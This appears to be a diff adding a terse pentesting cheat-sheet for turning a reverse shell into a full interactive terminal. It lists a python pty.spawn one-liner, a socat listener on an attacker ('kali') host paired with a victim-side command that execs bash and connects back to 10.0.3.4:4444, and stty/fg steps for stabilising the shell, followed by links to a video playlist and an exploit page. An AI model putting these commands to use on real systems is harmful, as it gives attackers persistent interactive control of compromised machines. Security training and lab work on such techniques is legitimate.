@@ -1,0 +1,29 @@
+
+1. python -c 'import pty; pty.spawn("/bin/bash")'
+python -c "import pty; pty.spawn('/bin/bash')"
+
+2. socat
+{
+	kali => socat file:`tty`,raw,echo=0 tcp-listen:4444
+	virtim=> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+}
+3. in revershell Ctrl+z
+stty raw -echo
+fg
+
+export TERM=xterm
+
+export SHELL=bash
+$ export TERM=xterm256-color
+$ stty rows 38 columns 116
+
+
+
+
+
+https://www.youtube.com/watch?v=-f-XFAVMDQ8&list=PLqM63j87R5p4Mp4NP-Oa1kLV6o22RDfex
+
+https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+
+SC
